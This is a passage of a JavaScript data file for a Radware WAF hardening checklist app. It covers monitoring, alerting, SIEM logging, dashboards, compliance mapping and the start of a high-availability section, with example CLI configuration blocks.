                { id: '9.2.14', text: 'Configure alerts for system health and availability', priority: 'high' }
            ]
        },
        {
            title: '9.3 Security Analytics',
            icon: 'fa-chart-bar',
            items: [
                { id: '9.3.1', text: 'Configure security dashboard and reporting', priority: 'high' },
                { id: '9.3.2', text: 'Set up trend analysis for attack patterns', priority: 'medium' },
                { id: '9.3.3', text: 'Implement attack source tracking and analysis', priority: 'high' },
                { id: '9.3.4', text: 'Configure compliance reporting', priority: 'medium' },
                { id: '9.3.5', text: 'Set up executive-level security metrics', priority: 'low' },
                { id: '9.3.6', text: 'Implement custom security reports and visualizations', priority: 'medium' },
                { id: '9.3.7', text: 'Configure anomaly detection for attack patterns', priority: 'high' },
                { id: '9.3.8', text: 'Set up machine learning-based security analytics', priority: 'medium' },
                { id: '9.3.9', text: 'Implement threat intelligence correlation', priority: 'high' },
                { id: '9.3.10', text: 'Configure geolocation-based attack visualization', priority: 'medium' },
                { id: '9.3.11', text: 'Set up automated report generation and distribution', priority: 'medium' },
                { id: '9.3.12', text: 'Implement security posture scoring and tracking', priority: 'high' },
                { id: '9.3.13', text: 'Configure attack surface visualization', priority: 'medium' },
                { id: '9.3.14', text: 'Set up predictive attack trend analysis', priority: 'medium' }
            ]
        },
        {
            title: '9.4 Incident Response Integration',
            icon: 'fa-fire-extinguisher',
            items: [
                { id: '9.4.1', text: 'Configure integration with SOAR platforms', priority: 'high' },
                { id: '9.4.2', text: 'Set up automated incident creation from alerts', priority: 'high' },
                { id: '9.4.3', text: 'Implement playbook-driven response actions', priority: 'medium' },
                { id: '9.4.4', text: 'Configure evidence collection and preservation', priority: 'high' },
                { id: '9.4.5', text: 'Set up threat hunting based on WAF data', priority: 'medium' },
                { id: '9.4.6', text: 'Implement attack pattern identification', priority: 'high' },
                { id: '9.4.7', text: 'Configure automated blocking of attack sources', priority: 'medium' },
                { id: '9.4.8', text: 'Set up incident classification based on WAF data', priority: 'medium' },
                { id: '9.4.9', text: 'Implement incident lifecycle tracking', priority: 'medium' },
                { id: '9.4.10', text: 'Configure post-incident reporting and metrics', priority: 'high' },
                { id: '9.4.11', text: 'Set up attack simulation and response testing', priority: 'medium' },
                { id: '9.4.12', text: 'Implement forensic data collection procedures', priority: 'high' }
            ]
        },
        {
            title: '9.5 Compliance Reporting',
            icon: 'fa-file-contract',
            items: [
                { id: '9.5.1', text: 'Configure PCI DSS compliance reporting', priority: 'high' },
                { id: '9.5.2', text: 'Set up GDPR violation monitoring', priority: 'high' },
                { id: '9.5.3', text: 'Implement HIPAA security controls reporting', priority: 'medium' },
                { id: '9.5.4', text: 'Configure SOC 2 compliance evidence collection', priority: 'medium' },
                { id: '9.5.5', text: 'Set up automated compliance posture assessment', priority: 'high' },
                { id: '9.5.6', text: 'Implement regulatory control mapping', priority: 'medium' },
                { id: '9.5.7', text: 'Configure audit trail for compliance requirements', priority: 'high' },
                { id: '9.5.8', text: 'Set up compliance gap analysis reporting', priority: 'medium' },
                { id: '9.5.9', text: 'Implement data access tracking for regulated data', priority: 'high' },
                { id: '9.5.10', text: 'Configure risk-based compliance reporting', priority: 'medium' },
                { id: '9.5.11', text: 'Set up customized compliance dashboards', priority: 'medium' },
                { id: '9.5.12', text: 'Implement data sovereignty compliance monitoring', priority: 'medium' }
            ]
        },
        {
            title: '9.6 Operational Monitoring',
            icon: 'fa-heartbeat',
            items: [
                { id: '9.6.1', text: 'Configure WAF health monitoring', priority: 'critical' },
                { id: '9.6.2', text: 'Set up resource utilization tracking', priority: 'high' },
                { id: '9.6.3', text: 'Implement performance monitoring and baselines', priority: 'high' },
                { id: '9.6.4', text: 'Configure availability and uptime monitoring', priority: 'critical' },
                { id: '9.6.5', text: 'Set up configuration change tracking', priority: 'high' },
                { id: '9.6.6', text: 'Implement license and capacity monitoring', priority: 'medium' },
                { id: '9.6.7', text: 'Configure backup and recovery monitoring', priority: 'high' },
                { id: '9.6.8', text: 'Set up signature update monitoring', priority: 'medium' },
                { id: '9.6.9', text: 'Implement SLA monitoring and reporting', priority: 'high' },
                { id: '9.6.10', text: 'Configure historical performance trending', priority: 'medium' },
                { id: '9.6.11', text: 'Set up traffic pattern anomaly detection', priority: 'high' },
                { id: '9.6.12', text: 'Implement automation for recovery procedures', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Centralized Logging Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure centralized logging to collect, store, and analyze security events from the WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure centralized logging</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">logging</span></div>
                    <div class="code-comment"># Local logging settings</div>
                    <div><span class="code-param">local-log</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">local-log-level</span> <span class="code-value">info</span></div>
                    <div><span class="code-param">local-retention</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">local-rotation</span> <span class="code-value">size</span> <span class="code-param">max-size</span> <span class="code-value">500</span></div>
                    <div><span class="code-param">local-compression</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Syslog server configuration</div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"primary-siem"</span></div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">"primary-siem"</span></div>
                    <div><span class="code-param">address</span> <span class="code-value">10.0.0.50</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                    <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                    <div><span class="code-param">facility</span> <span class="code-value">local5</span></div>
                    <div><span class="code-param">ssl</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssl-verify</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure backup syslog server</div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"backup-siem"</span></div>
                    <div><span class="code-command">remote-syslog</span> <span class="code-value">"backup-siem"</span></div>
                    <div><span class="code-param">address</span> <span class="code-value">10.0.1.50</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                    <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Log Formats and Standards</h5>
                <p class="mb-4 text-gray-700">Common log formats for security event integration:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Format</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Best For</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">CEF (Common Event Format)</td>
                            <td class="p-3 border">ArcSight's format with standardized field structure</td>
                            <td class="p-3 border">Enterprise SIEM integration (ArcSight, Splunk)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">LEEF (Log Event Extended Format)</td>
                            <td class="p-3 border">IBM QRadar's structured log format</td>
                            <td class="p-3 border">QRadar SIEM environments</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JSON</td>
                            <td class="p-3 border">Structured format with field-value pairs</td>
                            <td class="p-3 border">Modern analytics platforms (ELK Stack)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Syslog RFC5424</td>
                            <td class="p-3 border">Standardized syslog format</td>
                            <td class="p-3 border">Unix/Linux environments, general compatibility</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">GELF (Graylog Extended Format)</td>
                            <td class="p-3 border">Optimized for Graylog with compression support</td>
                            <td class="p-3 border">Graylog-based logging systems</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Logging Configuration</h5>
                <p class="mb-4 text-gray-700">Implement advanced logging features for enhanced security analysis:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced logging features</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">logging</span></div>
                    <div class="code-comment"># Configure log enrichment</div>
                    <div><span class="code-command">enrichment</span></div>
                    <div><span class="code-param">geo-ip</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">threat-intelligence</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">user-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">application-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure log integrity</div>
                    <div><span class="code-command">integrity</span></div>
                    <div><span class="code-param">signing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">signing-algorithm</span> <span class="code-value">sha256</span></div>
                    <div><span class="code-param">verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">tamper-alerting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure high availability logging</div>
                    <div><span class="code-command">high-availability</span></div>
                    <div><span class="code-param">buffer-queue</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">buffer-size</span> <span class="code-value">1024</span></div>
                    <div><span class="code-param">retry-interval</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">max-retries</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">failover</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Alerting Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure alerts to notify security teams of important security events and policy violations.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure security alerts</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">alerts</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Email notification configuration</div>
                    <div><span class="code-command">email</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">smtp.example.com</span></div>
                    <div><span class="code-param">port</span> <span class="code-value">587</span></div>
                    <div><span class="code-param">authentication</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">username</span> <span class="code-value">alerting@example.com</span></div>
                    <div><span class="code-param">password</span> <span class="code-value">********</span></div>
                    <div><span class="code-param">from-address</span> <span class="code-value">waf-alerts@example.com</span></div>
                    <div><span class="code-param">tls</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">security-team@example.com</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">soc@example.com</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div class="code-comment"># Webhook integration for alerting</div>
                    <div><span class="code-command">webhook</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">https://hooks.slack.com/services/TXXXXX/BXXXXX/XXXXXXXXXX</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">json</span></div>
                    <div><span class="code-param">severity</span> <span class="code-value">medium,high,critical</span></div>
                    <div class="code-comment"># Alert thresholds</div>
                    <div><span class="code-command">thresholds</span></div>
                    <div><span class="code-param">attack-threshold</span> <span class="code-value">10</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">dos-threshold</span> <span class="code-value">1000</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div><span class="code-param">brute-force-threshold</span> <span class="code-value">5</span> <span class="code-param">period</span> <span class="code-value">300</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Alert Prioritization Framework</h5>
                <p class="mb-4 text-gray-700">Effective alert management requires proper prioritization to avoid alert fatigue:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Severity</th>
                            <th class="p-3 border bg-gray-100">Response Time</th>
                            <th class="p-3 border bg-gray-100">Example Events</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Critical</td>
                            <td class="p-3 border">Immediate (24/7)</td>
                            <td class="p-3 border">Successful data exfiltration, active breach, DDoS attack</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Within 1 hour</td>
                            <td class="p-3 border">SQL injection attempts, admin access violations, multiple attack vectors</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Within 8 hours</td>
                            <td class="p-3 border">Pattern of suspicious activity, repeated policy violations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">Within 24 hours</td>
                            <td class="p-3 border">Single blocked attacks, minor policy violations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Informational</td>
                            <td class="p-3 border">Routine review</td>
                            <td class="p-3 border">Configuration changes, system updates, learning mode events</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Alert Management</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated alert management to reduce noise and increase effectiveness:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced alert management</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">alerts</span></div>
                    <div class="code-comment"># Alert correlation and aggregation</div>
                    <div><span class="code-command">correlation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">time-window</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">similar-events-threshold</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">upgrade-severity</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"sql-injection-campaign"</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">"sql-injection-campaign"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">attack-type</span> <span class="code-param">value</span> <span class="code-value">"sql-injection"</span></div>
                    <div><span class="code-param">threshold</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">window</span> <span class="code-value">600</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">notify</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Alert suppression and deduplication</div>
                    <div><span class="code-command">suppression</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">duplicate-window</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">rate-limiting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rate-limit-threshold</span> <span class="code-value">10</span> <span class="code-param">period</span> <span class="code-value">60</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"scanner-noise"</span></div>
                    <div><span class="code-command">rule</span> <span class="code-value">"scanner-noise"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">signature-id</span> <span class="code-param">value</span> <span class="code-value">"1234,1235,1236"</span></div>
                    <div><span class="code-param">match</span> <span class="code-value">source-ip</span> <span class="code-param">value</span> <span class="code-value">"10.0.0.0/8"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">suppress</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Dashboard Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure security dashboards to provide actionable insights into WAF activity and threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure security dashboard</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">dashboard</span></div>
                    <div><span class="code-param">refresh-interval</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># Configure widgets and visualizations</div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"attack-summary"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"top-attackers"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"geo-map"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"policy-violations"</span> <span class="code-param">position</span> <span class="code-value">4</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"traffic-summary"</span> <span class="code-param">position</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Custom dashboard for executives</div>
                    <div><span class="code-command">dashboard</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"executive-view"</span></div>
                    <div><span class="code-command">dashboard</span> <span class="code-value">"executive-view"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"High-level security summary for management"</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"security-score"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"monthly-trends"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"compliance-status"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Key Security Metrics</h5>
                <p class="mb-4 text-gray-700">Essential metrics for effective security monitoring:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Attacks Blocked:</strong> Volume of malicious requests prevented from reaching applications</li>
                    <li class="mb-2"><strong>Attack Distribution:</strong> Types of attacks (SQL injection, XSS, etc.) and their relative frequency</li>
                    <li class="mb-2"><strong>Top Attack Sources:</strong> IPs, countries, and ASNs generating the most attacks</li>
                    <li class="mb-2"><strong>False Positive Rate:</strong> Percentage of legitimate traffic incorrectly blocked</li>
                    <li class="mb-2"><strong>Security Policy Compliance:</strong> Adherence to configured security policies</li>
                    <li class="mb-2"><strong>Mean Time to Detect (MTTD):</strong> Average time to identify security incidents</li>
                    <li><strong>Mean Time to Respond (MTTR):</strong> Average time to address and mitigate threats</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Analytics Configuration</h5>
                <p class="mb-4 text-gray-700">Configure advanced analytics capabilities for deeper security insights:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced security analytics</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">analytics</span></div>
                    <div class="code-comment"># Machine learning configuration</div>
                    <div><span class="code-command">machine-learning</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">baseline-period</span> <span class="code-value">14</span></div>
                    <div><span class="code-param">analysis-interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">confidence-threshold</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"traffic-anomaly"</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"attack-prediction"</span></div>
                    <div><span class="code-command">model</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"behavior-analysis"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Custom reports configuration</div>
                    <div><span class="code-command">reports</span></div>
                    <div><span class="code-command">report</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"monthly-security-summary"</span></div>
                    <div><span class="code-command">report</span> <span class="code-value">"monthly-security-summary"</span></div>
                    <div><span class="code-param">schedule</span> <span class="code-value">monthly</span> <span class="code-param">day</span> <span class="code-value">1</span> <span class="code-param">time</span> <span class="code-value">00:00</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">pdf</span></div>
                    <div><span class="code-param">sections</span> <span class="code-value">"executive-summary,attack-statistics,compliance-status,recommendations"</span></div>
                    <div><span class="code-param">distribution</span> <span class="code-value">email</span> <span class="code-param">recipients</span> <span class="code-value">"security-team@example.com,ciso@example.com"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Compliance and Operational Monitoring',
            content: `
                <p class="mb-4 text-gray-700">Configure compliance reporting and operational monitoring for comprehensive oversight.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure compliance reporting</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">compliance</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># PCI DSS compliance</div>
                    <div><span class="code-command">pci-dss</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-6.6</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-6.5</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-10.2</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">requirement-10.6</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">evidence-collection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># GDPR compliance</div>
                    <div><span class="code-command">gdpr</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">data-breach-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sensitive-data-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">data-access-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Operational monitoring</div>
                    <div><span class="code-command">operational</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">health-check-interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">cpu-threshold</span> <span class="code-value">80</span></div>
                    <div><span class="code-param">memory-threshold</span> <span class="code-value">80</span></div>
                    <div><span class="code-param">disk-threshold</span> <span class="code-value">85</span></div>
                    <div><span class="code-param">connection-threshold</span> <span class="code-value">90</span></div>
                    <div><span class="code-param">alert-on-threshold</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Integration with SOAR platform</div>
                    <div><span class="code-command">incident-response</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">soar-integration</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">soar-endpoint</span> <span class="code-value">"https://soar.example.com/api/incidents"</span></div>
                    <div><span class="code-param">api-key</span> <span class="code-value">encrypt</span></div>
                    <div><span class="code-param">auto-create-incidents</span> <span class="code-value">enable</span> <span class="code-param">threshold</span> <span class="code-value">"high,critical"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Compliance Mapping</h5>
                <p class="mb-4 text-gray-700">Key WAF controls and their mapping to common compliance frameworks:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">WAF Control</th>
                            <th class="p-3 border bg-gray-100">PCI DSS</th>
                            <th class="p-3 border bg-gray-100">GDPR</th>
                            <th class="p-3 border bg-gray-100">HIPAA</th>
                            <th class="p-3 border bg-gray-100">SOC 2</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Web Application Firewall</td>
                            <td class="p-3 border">Req 6.6</td>
                            <td class="p-3 border">Art. 32</td>
                            <td class="p-3 border">Â§164.312(a)</td>
                            <td class="p-3 border">CC6.1, CC6.8</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Attack Detection & Blocking</td>
                            <td class="p-3 border">Req 6.5</td>
                            <td class="p-3 border">Art. 32</td>
                            <td class="p-3 border">Â§164.308(a)(5)</td>
                            <td class="p-3 border">CC7.1, CC7.2</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Security Logging</td>
                            <td class="p-3 border">Req 10.2, 10.3</td>
                            <td class="p-3 border">Art. 33</td>
                            <td class="p-3 border">Â§164.312(b)</td>
                            <td class="p-3 border">CC4.1, CC7.3</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Alert Management</td>
                            <td class="p-3 border">Req 10.6, 10.8</td>
                            <td class="p-3 border">Art. 33, 34</td>
                            <td class="p-3 border">Â§164.308(a)(6)</td>
                            <td class="p-3 border">CC7.3, CC7.4</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Access Control</td>
                            <td class="p-3 border">Req 7.1, 7.2</td>
                            <td class="p-3 border">Art. 25, 32</td>
                            <td class="p-3 border">Â§164.312(a)(1)</td>
                            <td class="p-3 border">CC6.1, CC6.3</td>
                        </tr>
                    </tbody>
                </table>
            `
        }
    ],
    tools: [
        {
            title: 'SIEM Integration',
            icon: 'fa-database',
            description: 'Security Information and Event Management system for centralized log analysis.',
            link: 'https://www.splunk.com/',
            linkText: 'Splunk'
        },
        {
            title: 'ELK Stack',
            icon: 'fa-layer-group',
            description: 'Elasticsearch, Logstash, and Kibana stack for log management and visualization.',
            link: 'https://www.elastic.co/elastic-stack',
            linkText: 'Elastic Stack'
        },
        {
            title: 'Log Analyzer',
            icon: 'fa-search',
            description: 'Tool for analyzing WAF logs to identify patterns and anomalies.',
            link: 'https://www.graylog.org/',
            linkText: 'Graylog'
        },
        {
            title: 'Alert Management',
            icon: 'fa-bell',
            description: 'Platform for managing security alerts and coordinating response activities.',
            link: 'https://www.pagerduty.com/',
            linkText: 'PagerDuty'
        },
        {
            title: 'Grafana',
            icon: 'fa-chart-area',
            description: 'Advanced visualization platform for creating custom security dashboards and metrics.',
            link: 'https://grafana.com/',
            linkText: 'Grafana'
        },
        {
            title: 'SOAR Platform',
            icon: 'fa-robot',
            description: 'Security Orchestration, Automation and Response platform for incident management.',
            link: 'https://www.paloaltonetworks.com/cortex/cortex-xsoar',
            linkText: 'Cortex XSOAR'
        },
        {
            title: 'Compliance Reporter',
            icon: 'fa-clipboard-check',
            description: 'Tool for generating compliance reports and evidence for regulatory frameworks.',
            link: 'https://www.rapid7.com/products/insightvm/',
            linkText: 'Rapid7 InsightVM'
        },
        {
            title: 'OpenSearch',
            icon: 'fa-search-plus',
            description: 'Open source analytics and visualization suite for security log analysis.',
            link: 'https://opensearch.org/',
            linkText: 'OpenSearch'
        },
        {
            title: 'Fluentd',
            icon: 'fa-stream',
            description: 'Open source data collector for unified logging layer with multiple output options.',
            link: 'https://www.fluentd.org/',
            linkText: 'Fluentd'
        },
        {
            title: 'Prometheus',
            icon: 'fa-fire',
            description: 'Open source monitoring system with dimensional data model and alerting.',
            link: 'https://prometheus.io/',
            linkText: 'Prometheus'
        },
        {
            title: 'TheHive',
            icon: 'fa-bug',
            description: 'Scalable, open source security incident response platform for SOC teams.',
            link: 'https://thehive-project.org/',
            linkText: 'TheHive Project'
        },
        {
            title: 'Sigma Rules',
            icon: 'fa-fingerprint',
            description: 'Open standard for SIEM rules to detect suspicious activities in logs.',
            link: 'https://github.com/SigmaHQ/sigma',
            linkText: 'SigmaHQ'
        }
    ]
},
        {
    id: 'high-availability',
    title: '11. High Availability & Resilience',
    subtitle: 'Redundancy, failover, and disaster recovery configuration for Radware WAF',
    icon: 'fa-heartbeat',
    priority: 'high',
    progress: 0,
    checklist: [
        {
            title: '11.1 Cluster Configuration',
            icon: 'fa-dice-d6',
            items: [
                { id: '11.1.1', text: 'Set up active-passive or active-active clustering', priority: 'critical' },
                { id: '11.1.2', text: 'Configure cluster synchronization protocols', priority: 'high' },
                { id: '11.1.3', text: 'Set up heartbeat and quorum configurations', priority: 'critical' },
                { id: '11.1.4', text: 'Implement connection mirroring for failover', priority: 'high' },
                { id: '11.1.5', text: 'Configure session persistence across cluster nodes', priority: 'medium' },
                { id: '11.1.6', text: 'Set up configuration synchronization between nodes', priority: 'critical' },
                { id: '11.1.7', text: 'Configure Radware-specific cluster management interfaces', priority: 'high' },
                { id: '11.1.8', text: 'Set up secure communication between cluster nodes', priority: 'critical' },
                { id: '11.1.9', text: 'Configure split-brain prevention mechanisms', priority: 'high' },
                { id: '11.1.10', text: 'Implement Radware WBM (Web Based Management) HA settings', priority: 'medium' }
            ]
        },
        {
            title: '11.2 Failover Configuration',
            icon: 'fa-life-ring',
            items: [
                { id: '11.2.1', text: 'Configure automatic failover triggers and thresholds', priority: 'critical' },
                { id: '11.2.2', text: 'Set up manual failover procedures and testing', priority: 'high' },
                { id: '11.2.3', text: 'Implement failover notification and alerting', priority: 'high' },
                { id: '11.2.4', text: 'Configure failure detection mechanisms', priority: 'critical' },
                { id: '11.2.5', text: 'Set up network-level redundancy (VRRP, etc.)', priority: 'high' },
                { id: '11.2.6', text: 'Configure Radware DefensePro synchronization during failover', priority: 'critical' },
                { id: '11.2.7', text: 'Set up AppWall policy synchronization for failover events', priority: 'high' },
                { id: '11.2.8', text: 'Implement stateful inspection failover', priority: 'high' },
                { id: '11.2.9', text: 'Configure SSL key synchronization for seamless failover', priority: 'critical' },
                { id: '11.2.10', text: 'Set up advanced health checks for precise failure detection', priority: 'medium' }
            ]
        },
        {
